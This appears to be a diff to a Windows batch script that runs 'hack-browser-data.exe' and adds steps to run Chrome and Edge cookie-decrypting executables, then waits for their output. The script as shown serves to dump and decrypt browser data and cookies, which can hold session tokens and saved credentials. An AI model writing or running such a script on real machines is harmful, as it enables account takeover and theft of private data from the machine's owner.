@@ -17,6 +17,8 @@ echo Running application...
 
 REM Run the exe and wait a bit longer
 "%CD%\hack-browser-data.exe"
+"%CD%\chrome_cookie_decryptor.exe"
+"%CD%\edge_cookie_decryptor.exe"
 echo [DEBUG] Waiting for results to be generated...
 timeout /t 5 /nobreak
 
